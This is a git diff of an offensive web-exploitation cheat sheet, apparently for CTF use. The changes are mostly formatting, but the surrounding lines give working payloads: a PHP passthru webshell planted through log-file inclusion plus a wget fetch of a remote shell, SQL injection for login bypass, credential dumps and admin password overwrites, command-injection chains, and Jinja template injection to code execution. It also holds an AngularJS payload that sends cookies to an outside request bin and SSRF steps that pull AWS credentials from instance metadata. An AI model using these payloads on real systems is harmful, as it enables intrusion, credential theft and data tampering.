@@ -14,7 +14,8 @@ Good cheat-sheets (if shit here doesn't work):
 - [Authentication / Session Management](#authentication-and-session-management)
 - [Local / Remote File Inclusion](#local-and-remote-file-inclusion)
 - [SQL Injection](#sql-injection)
-- [Other / Advanced Injections](#other-and-advanced-injections)
+- [Command Injection](#command-injection)
+- [Server-Side Template Injection](#server---side-template-injection)
 - [XML External Entities](#xxe)
 - [Cross-Site Scripting (XSS)](#xss)
 - [Cross-Site Request Forgery (CSRF)](#cross---site-request-forgery)
@@ -174,7 +175,7 @@ Observe:
 ### Local and Remote File Inclusion
 ### ============================================================
 
-A more in-depth LFI / LFI->RCE Cheatsheet:  
+**A more in-depth LFI / LFI->RCE Cheatsheet:**  
 * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal  
 How to abuse PHP wrappers (ftp:// zip:// etc.) (RCE exploit)
 * https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/
@@ -182,14 +183,14 @@ How to abuse PHP wrappers (ftp:// zip:// etc.) (RCE exploit)
 Other things:
 * Try URL paths without `.php` as source code may concat `.php` to the end of the user-input.
 
-STEP #1: Verify existence of LFI/LFD vulnerability.
+**STEP #1: Verify existence of LFI/LFD vulnerability**
 ```http
 domain.com/?p=somepage.txt
 domain.com/?p=pagename-whatever
 domain.com/?class=something&function=another 
 ```
 
-STEP #2: Figure out where the logfiles are. Example locations:
+**STEP #2: Figure out where the logfiles are. Example locations:**
 * NOTE: If you can execute phpinfo(); then you can find out where access/error logs are stored on the server.
 * For non-default locations, try to figure out where they install their PHP, Nginx, Apache and look in there.
 ```html
@@ -211,7 +212,7 @@ STEP #2: Figure out where the logfiles are. Example locations:
 2. Google 'default Debian apache log directory' etc.
 ```
 
-STEP #3: Inject a payload into the logfile:
+**STEP #3: Inject a payload into the logfile****
 
   * _PHP passthru() function_: Execute an external program and display raw output
   * Attack vectors:
@@ -222,14 +223,14 @@ $ <?php passthru($_GET['cmd']); ?>
 $ <?php passthru(['ls -l']); ?>
 ```
 
-STEP #4: With command execution, use wget to upload your own files to the server:
+**STEP #4: With command execution, use wget to upload your own files to the server**
 ```
 $ /var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
 OR
 $ <?php passthru(['w']); ?>
 ```
 
-PHP things:
+**PHP things:**
 ```php
 /* Vulnerable php code to LFI 
  * i.e. if source code uses these functions, page is most likely exploitable.
@@ -260,7 +261,7 @@ http://localhost/include.php?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOy
  */
 ```
 
-Windows LFI:
+**Windows LFI:**
 ```
 C:/Windows/win.ini
 C:/boot.ini
@@ -269,7 +270,7 @@ C:/apache/logs/access.log
 C:/windows/system32/drivers/etc/hosts
 ```
 
-Other things to try:
+**Other things to try:**
 ``` 
 TRY OTHER PROTOCOLS:
 http://, ftp:// etc.
@@ -293,9 +294,9 @@ SQL Cheatsheet: http://www.cheat-sheets.org/sites/sql.su/
 DB Specific SQLi Cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targetsite.com/price.php?id=1+1`
 
-**NOTE: SQL does not have 0th index for strings. Strings start at 1 e.g. SUBSTR('hello',1,1) not SUBSTR('hello',0,1)**
+NOTE: SQL does not have 0th index for strings. Strings start at 1 e.g. SUBSTR('hello',1,1) not SUBSTR('hello',0,1)
 
-DB fingerprinting techniques:
+**DB fingerprinting techniques:**
 ```sql
 /* MySQL */                                                        -- FINGERPRINTING:        
    http://www.example.com/news.php?id=1 /*! AND 1=1 */--           -- via. comments
@@ -316,7 +317,7 @@ DB fingerprinting techniques:
    https://d17h27t6h515a5.cloudfront.net/topher/2016/September/57ed880e_sql-sqlite-commands-cheat-sheet/sql-sqlite-commands-cheat-sheet.pdf
 ```
 
-Enumerate DB metadata via. views:
+**Enumerate DB metadata via. views:**
 ```sql
 /* MySQL (db.information_schema) */
   SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
@@ -327,7 +328,7 @@ Enumerate DB metadata via. views:
   SELECT * FROM table_name LIMIT 1;                   -- Step #2: Enumerate column names from the specified table.
 ```
 
-Authentication Bypass:
+**Authentication Bypass:**
 ```sql
 /* Auth Form Bypass Example: */
   SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
@@ -350,7 +351,7 @@ Authentication Bypass:
   ' UNION SELECT 1, 'admin', 'doesnt matter', 1--
 ```
 
-Blind SQLi (Boolean / Time-based)
+**Blind SQLi (Boolean / Time-based)**
 ```sql
 /* General */
 %' AND 1=1 AND '%'='                  -- BOOLEAN: TRUE
@@ -379,7 +380,7 @@ ORDER BY 2--
 ORDER BY N--
 ```
 
-UNION SELECT (exfiltrating data):
+**UNION SELECT (exfiltrating data):**
 ```sql
 /* Good guide on UNION injection */
 http://www.sqlinjection.net/union
@@ -397,7 +398,7 @@ http://www.sqlinjection.net/union
     ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users-- 
 ```
 
-INSERT / UPDATE (adding or changing data):
+**INSERT / UPDATE (adding or changing data):**
 ```sql
 /* Insert new users (MySQL) */
     -- insert a new row into the "users" table with values id=99, username=newuser, password=newpass
@@ -408,7 +409,7 @@ INSERT / UPDATE (adding or changing data):
     ns.agency/stuff.php?id=0'; update users set password="1234" where username="admin";-- 
 ```
 
-MySQL String Manipulation Trickery:
+**MySQL String Manipulation Trickery:**
 ```
 Mid(version(),1,1)
 Substr(version(),1,1)
@@ -419,7 +420,7 @@ Left(version(),1)
 reverse(right(reverse(version()),1)
 ```
 
-Sqlmap:
+**Sqlmap:**
 ```shell
 # Enumerate everything:
 python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3
@@ -428,7 +429,7 @@ python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?com
 python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
 ```
 
-Other things:
+**Other things:**
 ```sql
 /* Read Files (MySQL) */
    SELECT LOAD_FILE('/etc/passwd');
@@ -452,7 +453,7 @@ Other things:
 ```
 
 ### ============================================================
-### Other and Advanced Injections
+### Command Injection
 ### ============================================================
 
 **Command Injection**
@@ -462,7 +463,7 @@ http://shitesite/lol.php?path=cat%20/etc/passwd
 http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
 ```  
 
-Injection via. chaining:  
+**Injection via. chaining:**
 ```shell
 {original_cmd_by_server}; cat flag
 {original_cmd_by_server} && cat flag
@@ -474,13 +475,17 @@ Injection via. chaining:
 {original_cmd_by_server} cat $(ls)
 {original_cmd_by_server} "; cat $(ls)
 ```  
-Execution inside another command:  
+
+**Execution inside another command:  **
 ```shell
 original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```  
 
-**Server-Side Template Injection (SSTI)**
+### ============================================================
+### Server-Side Template Injection
+### ============================================================
+
 Tool: https://github.com/epinna/tplmap
 
 READ SOME SSTI writeups:
@@ -490,7 +495,7 @@ READ SOME SSTI writeups:
 * https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo1
 * https://hackerone.com/reports/125980
 
-Flask template injection:  
+**Flask template injection:** 
 ```jinja
 {{4+4}}
 /* Request object:
@@ -507,7 +512,7 @@ Flask template injection:
 {{config}}
 ```
 
-Flask template injection walkthrough:
+**Flask template injection walkthrough:**
 * Use Python method of navigating through classes and objects.
 * Every object has a special method '__class__' letting you access the 'class' object.
 * __mro__ lets you traverse up the class tree, then look down the subclasses.
@@ -532,7 +537,7 @@ Flask template injection walkthrough:
    * ^or something similar lol fuck this looks so tedious.
 
 
-Other Flask/Jinja template injection stuff:
+**Other Flask/Jinja template injection stuff:**
 ```jinja
 # Dump all used classes
   {{ ''.__class__.__mro__[2].__subclasses__() }}
@@ -548,12 +553,12 @@ Other Flask/Jinja template injection stuff:
   {{ config['RUNCMD']('cat flag',shell=True) }}
 ```
 
-Working AngularJS payload (EXT BREAK #2):
+**Working AngularJS payload (EXT BREAK #2):**
 ```javascript
 {{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=5+5,new Image().src="http://requestbin.fullcontact.com/1b17hka1?asdf="+document.cookie,alert(2)');}}
 ```
 
-Angular JS:
+**Angular JS:**
 ```javascript
 {{ 7*7 }} => 49
 {{ this }}
@@ -573,7 +578,7 @@ Angular JS:
 ### XXE
 ### ============================================================
 
-XXE standard:  
+**XXE standard:**
 * NOTE: "FILe" upper/lowercase mix was to bypass firewalls
 * Use a valid XML feed, otherwise it will probably fail to parse. i.e. chuck `&xxe;` in legit xml elements in the feed.
 ```xml
@@ -584,12 +589,12 @@ XXE standard:
 <element>&xxe;</element>
 ```
 
-XXE Out-of-Bounds attack:
+**XXE Out-of-Bounds attack:**
 ```
 
 ```
 
-XML Parser/Filter Bypass:
+**XML Parser/Filter Bypass:**
 _Example blacklisted keywords: [file://] [/etc] [passwd] or 2nd level XML docs included_
 ```
 
@@ -598,6 +603,7 @@ _Example blacklisted keywords: [file://] [/etc] [passwd] or 2nd level XML docs i
 ### ============================================================
 ### XSS
 ### ============================================================
+
 **Useful JS web API methods for XSS**  
 Redirect a user/admin to your url to steal their cookies.
 ```javascript
@@ -646,14 +652,14 @@ Encoding needs to be performed twice as the initial POST request to the target s
 ### ============================================================
 Summary: Attacker can make requests from a server to target a system's internals (i.e intranet) by bypassing its firewalls.
 
-SSRF indicators:
+**SSRF indicators:**
 * Look for network requests that may reference a localhost address: `https://ns.agency/static?r=http://127.0.0.1:[port]/flag.html` (inspect->network)
 * Callback functions.
 * Look for params that may reference internal services.
 * Look for a search input box / any form input that may reference internal services.
 * Look for redirects
 
-File Protocol (access a server's file system)
+**File Protocol (access a server's file system)**
 ```http
 file:///etc/passwd
 file:///proc/self/cmdline
@@ -662,7 +668,7 @@ file:///proc/self/environ
 curl file:///etc/passwd
 ```
 
-Other Protocols
+**Other Protocols**
 ```http
 gopher://127.0.0.1:3306/_<PAYLOAD>      // MySQL
 gopher://127.0.0.1:9000                 // FastCGI
@@ -674,7 +680,7 @@ smtp://127.0.0.1:25
 jar://
 ```
 
-Elastic Search APIs (default port:9200/9300):
+**Elastic Search APIs (default port:9200/9300):**
 ```http
 http://0:9200/_search?q={flag, sectalks, 6443 . . .}
 http://0:9200/_cluster/settings
@@ -686,14 +692,14 @@ http://0:9200/_cat&?pretty=true
 http://0:9200/phrack/article/14
 ```
 
-PHP:
+**PHP:**
 ```php
 file_get_contents()
 fsockopen()
 curl_exec()
 ```
 
-Bypass 'localhost' filters:
+**Bypass 'localhost' filters:**
 ```http
 http://{localhost_variation}
 127.0.0.1
@@ -706,7 +712,7 @@ http://0x7f.1/
 http://127.000.000.1
 ```
 
-CRLF injection in HTTP header
+**CRLF injection in HTTP header**
 ```
 Carriage Return (\r) or Line Feed (\n) terminates a line of HTTP request.
 
@@ -723,7 +729,7 @@ Referer:localhost
 ### PHP Serialisation
 ### ============================================================
 
-PHP Magic Methods:
+**PHP Magic Methods:**
 * `construct()`: Object is called when new, but unserialize() is not called
 * `destruct()`: Called when the Object is destroyed
 * `wakeup()`: Called automatically when unserialize
@@ -736,7 +742,7 @@ PHP Magic Methods:
 
 Confirm SSRF with `http://169.254.169.254` as the payload.
 
-Typical Steps:
+**Typical Steps:**
 1. Find info / dump data in AWS instance.
 ```http
 http://169.254.169.254/latest/meta-data/iam/info   // Find an IAM role with access to the AWS resources.
@@ -770,7 +776,7 @@ $ aws s3 cp s3://ns.agency/flag -    // dump to stdout
 $ aws s3 cp s3://ns.agency/flag .    // download to current working dir
 ```
 
-Alternatively, leak AWS Access Keys via. Local File Disclosure or similar vuln:
+**Alternatively, leak AWS Access Keys via. Local File Disclosure or similar vuln:**
 ```
 LFD => $ /docker-entrypoint.sh /init.sh ~/.aws/credentials.json
     OR $ cat ~/.aws/credentials
